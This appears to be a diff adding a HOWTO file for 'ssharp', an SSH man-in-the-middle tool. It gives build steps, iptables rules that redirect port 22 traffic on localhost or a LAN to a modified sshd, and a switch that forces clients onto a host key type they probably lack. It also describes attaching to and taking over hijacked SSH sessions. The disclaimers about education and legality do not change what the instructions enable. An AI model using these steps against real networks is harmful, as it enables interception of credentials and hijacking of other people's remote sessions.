@@ -1,0 +1,81 @@
+HOWTO
+=====
+
+1.
+
+Think! Only YOU are responsible for your own actions.
+
+Ssharp is provided 'AS IS' without any warranty.
+It is for educational and demonstration purposes only.
+The author is not responsible for any damage you might cause
+when using it.
+Ssharp is NOT for free distribution. It is derived from
+a BSD-like licensed software and you are NOT allowed to
+distribute it.
+
+
+2.
+
+Prefered prefix is /usr/local.
+
+(Edit ssharp.h to fit your OS and paths if needed)
+# configure; make ssh; make
+# make install
+
+3.
+
+# cp ssh /usr/local/bin/ssharpclient (or whatever your path is)
+
+(Assuming you already have a sshd package installed; make sure
+ssharp can find its hostkeys etc.)
+
+Disable RSA authentication.
+
+4.
+
+For localhost testing:
+
+# iptables -t nat -A OUTPUT -p tcp --sport 1000:5000 --dport 22 -j REDIRECT\
+  --to-port 10000
+
+For in-LAN testing:
+
+# iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 10000 -i eth0
+# <redirect-magic> :)
+
+(maybe you need to specify different portranges if ssh clients come
+from src-port 30000+X)
+  
+5.
+
+# ./sshd -4 -p 10000
+
+6.
+
+Return to coding.
+
+
+If you want to use the SSH2-only MiM, add -7 switch to line seen at 5:
+
+# ./sshd -4 -p 10000 -7
+
+This will make sshd look which key (DSA or RSA) the client probably does
+not already have and will force it to use.
+
+If you have still some spare time, you may have a look at ssh-walk script.
+
+If having even more spare time you may want to compile ssharp with
+USE_MSS option and install the mss server and client into /usr/local/bin.
+Then ssharp will slip the session through a screen-like terminal
+which allows you to attach to hijacked SSH sessions. mss-server will
+create /tmp/ssharp-IP.PID socket which can be used as argument for
+mss-client. If PID is killed and someone attached to the mss-server
+before the legitimate client is killed and you own the session as
+the only one. TAKE CARE TO STAY LEGAL!!!
+mss can be found at http://stealth.7350.org/
+
+In urgent cases I may be reached through stealth@segfault.net.
+
+Stealth
+
+
